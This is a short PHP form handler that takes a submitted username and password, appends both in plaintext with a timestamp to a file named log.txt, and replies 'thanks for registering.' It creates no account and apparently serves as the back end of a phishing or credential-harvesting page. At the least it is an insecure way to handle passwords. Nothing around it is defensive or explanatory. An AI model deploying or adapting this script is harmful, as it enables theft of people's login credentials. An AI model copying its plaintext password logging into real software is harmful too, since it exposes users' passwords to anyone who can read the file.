<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capture the username and password from the form
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Open the file in append mode
    $file = fopen("log.txt", "a");

    // Write the username and password to the file
    // Format: Username: [username], Password: [password], Timestamp: [timestamp]
    $log_entry = "Username: $username, Password: $password, Timestamp: " . date("Y-m-d H:i:s") . "\n";
    fwrite($file, $log_entry);

    // Close the file
    fclose($file);

    // Notify the user
    echo "<h1>thanks for registering.</h1>";
} else {
    echo "<h1>Invalid request method.</h1>";
}
?>
